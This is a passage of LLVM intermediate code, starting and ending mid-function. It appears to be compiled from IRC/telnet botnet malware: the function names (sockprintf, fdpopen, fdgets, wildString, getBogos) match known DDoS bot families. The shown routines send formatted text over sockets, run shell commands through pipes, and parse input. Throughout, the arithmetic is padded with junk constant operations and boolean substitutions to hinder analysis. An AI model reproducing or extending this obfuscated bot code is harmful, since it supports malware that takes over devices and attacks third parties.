  %79 = add i32 %78, 280674866
  %80 = add i32 %79, 48
  %81 = sub i32 %80, 280674866
  %82 = add nsw i32 %78, 48
  %83 = trunc i32 %81 to i8
  %84 = load i8*, i8** %17, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 -1
  store i8* %85, i8** %17, align 8
  store i8 %83, i8* %85, align 1
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %21, align 4
  %88 = udiv i32 %87, %86
  store i32 %88, i32* %21, align 4
  br label %53

; <label>:89:                                     ; preds = %53
  %90 = load i32, i32* %19, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %118

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %13, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %114

; <label>:95:                                     ; preds = %92
  %96 = load i32, i32* %14, align 4
  %97 = xor i32 2, -1
  %98 = xor i32 %96, %97
  %99 = and i32 %98, %96
  %100 = and i32 %96, 2
  %101 = icmp ne i32 %99, 0
  br i1 %101, label %102, label %114

; <label>:102:                                    ; preds = %95
  %103 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %103, i32 45)
  %104 = load i32, i32* %20, align 4
  %105 = sub i32 %104, -1491478457
  %106 = add i32 %105, 1
  %107 = add i32 %106, -1491478457
  %108 = add nsw i32 %104, 1
  store i32 %107, i32* %20, align 4
  %109 = load i32, i32* %13, align 4
  %110 = sub i32 %109, -1376279057
  %111 = add i32 %110, -1
  %112 = add i32 %111, -1376279057
  %113 = add nsw i32 %109, -1
  store i32 %112, i32* %13, align 4
  br label %117

; <label>:114:                                    ; preds = %95, %92
  %115 = load i8*, i8** %17, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 -1
  store i8* %116, i8** %17, align 8
  store i8 45, i8* %116, align 1
  br label %117

; <label>:117:                                    ; preds = %114, %102
  br label %118

; <label>:118:                                    ; preds = %117, %89
  %119 = load i32, i32* %20, align 4
  %120 = load i8**, i8*** %9, align 8
  %121 = load i8*, i8** %17, align 8
  %122 = load i32, i32* %13, align 4
  %123 = load i32, i32* %14, align 4
  %124 = call i32 @prints(i8** %120, i8* %121, i32 %122, i32 %123)
  %125 = add i32 %119, 1303833263
  %126 = add i32 %125, %124
  %127 = sub i32 %126, 1303833263
  %128 = add nsw i32 %119, %124
  store i32 %127, i32* %8, align 4
  br label %129

; <label>:129:                                    ; preds = %118, %25
  %130 = load i32, i32* %8, align 4
  ret i32 %130
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #4

declare i64 @write(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #4
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #4
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

declare i64 @send(i32, i8*, i64, i32) #5

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #4
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #4
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #4
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #4
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #4
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* %99, i8* null) #4
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #3

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %65

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #4
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #4
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #4
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #4
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #4
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #4
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %63

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 65280, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65280
  %62 = ashr i32 %60, 8
  br label %63

; <label>:63:                                     ; preds = %53, %52
  %64 = phi i32 [ -1, %52 ], [ %62, %53 ]
  store i32 %64, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %63, %19
  %66 = load i32, i32* %2, align 4
  ret i32 %66
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #3

declare i32 @waitpid(i32, i32*, i32) #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %40

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 %35, -224468859
  %37 = add i32 %36, 1
  %38 = add i32 %37, -224468859
  %39 = add nsw i32 %35, 1
  store i32 %38, i32* %8, align 4
  br label %9

; <label>:40:                                     ; preds = %25
  %41 = load i32, i32* %7, align 4
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %40
  br label %46

; <label>:44:                                     ; preds = %40
  %45 = load i8*, i8** %4, align 8
  br label %46

; <label>:46:                                     ; preds = %44, %43
  %47 = phi i8* [ null, %43 ], [ %45, %44 ]
  ret i8* %47
}

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %39

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = xor i64 %16, -1
  %24 = xor i64 %22, -1
  %25 = xor i64 -6060386324037867749, -1
  %26 = and i64 %23, -6060386324037867749
  %27 = and i64 %16, %25
  %28 = and i64 %24, -6060386324037867749
  %29 = and i64 %22, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 -6060386324037867749, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %16, %22
  store i64 %37, i64* %3, align 8
  br label %4

; <label>:39:                                     ; preds = %12
  %40 = load i64, i64* %3, align 8
  ret i64 %40
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %89 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %52
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %126

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = or i1 %31, %33
  %35 = xor i1 %29, true
  br label %36

; <label>:36:                                     ; preds = %24, %19
  %37 = phi i1 [ false, %19 ], [ %34, %24 ]
  br label %38

; <label>:38:                                     ; preds = %36, %13
  %39 = phi i1 [ true, %13 ], [ %37, %36 ]
  %40 = xor i1 %39, true
  %41 = and i1 false, %40
  %42 = xor i1 false, true
  %43 = and i1 %39, %42
  %44 = xor i1 true, true
  %45 = and i1 %44, false
  %46 = and i1 true, %42
  %47 = or i1 %41, %43
  %48 = or i1 %45, %46
  %49 = xor i1 %47, %48
  %50 = xor i1 %39, true
  %51 = zext i1 %49 to i32
  store i32 %51, i32* %3, align 4
  br label %126

; <label>:52:                                     ; preds = %2
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %75

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %4, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = load i8*, i8** %5, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 1
  %62 = call i32 @wildString(i8* %59, i8* %61)
  %63 = icmp ne i32 %62, 0
  %64 = xor i1 %63, true
  %65 = and i1 true, %64
  %66 = xor i1 true, true
  %67 = and i1 %63, %66
  %68 = xor i1 true, true
  %69 = and i1 %68, true
  %70 = and i1 true, %66
  %71 = or i1 %65, %67
  %72 = or i1 %69, %70
  %73 = xor i1 %71, %72
  %74 = xor i1 %63, true
  br label %75

; <label>:75:                                     ; preds = %57, %52
  %76 = phi i1 [ false, %52 ], [ %73, %57 ]
  %77 = xor i1 %76, true
  %78 = and i1 true, %77
  %79 = xor i1 true, true
  %80 = and i1 %76, %79
  %81 = xor i1 true, true
  %82 = and i1 %81, true
  %83 = and i1 true, %79
  %84 = or i1 %78, %80
  %85 = or i1 %82, %83
  %86 = xor i1 %84, %85
  %87 = xor i1 %76, true
  %88 = zext i1 %86 to i32
  store i32 %88, i32* %3, align 4
  br label %126

; <label>:89:                                     ; preds = %2
  %90 = load i8*, i8** %4, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = call i32 @toupper(i32 %92) #10
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = call i32 @toupper(i32 %96) #10
  %98 = icmp eq i32 %93, %97
  br i1 %98, label %99, label %117

; <label>:99:                                     ; preds = %89
  %100 = load i8*, i8** %4, align 8
  %101 = getelementptr inbounds i8, i8* %100, i64 1
  %102 = load i8*, i8** %5, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i32 @wildString(i8* %101, i8* %103)
  %105 = icmp ne i32 %104, 0
  %106 = xor i1 %105, true
  %107 = and i1 true, %106
  %108 = xor i1 true, true
  %109 = and i1 %105, %108
  %110 = xor i1 true, true
  %111 = and i1 %110, true
  %112 = and i1 true, %108
  %113 = or i1 %107, %109
  %114 = or i1 %111, %112
  %115 = xor i1 %113, %114
  %116 = xor i1 %105, true
  br label %117

; <label>:117:                                    ; preds = %99, %89
  %118 = phi i1 [ false, %89 ], [ %115, %99 ]
  %119 = xor i1 %118, true
  %120 = and i1 true, %119
  %121 = xor i1 true, true
  %122 = and i1 %118, %121
  %123 = or i1 %120, %122
  %124 = xor i1 %118, true
  %125 = zext i1 %123 to i32
  store i32 %125, i32* %3, align 4
  br label %126

; <label>:126:                                    ; preds = %117, %75, %38, %9
  %127 = load i32, i32* %3, align 4
  ret i32 %127
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #4
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %91, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
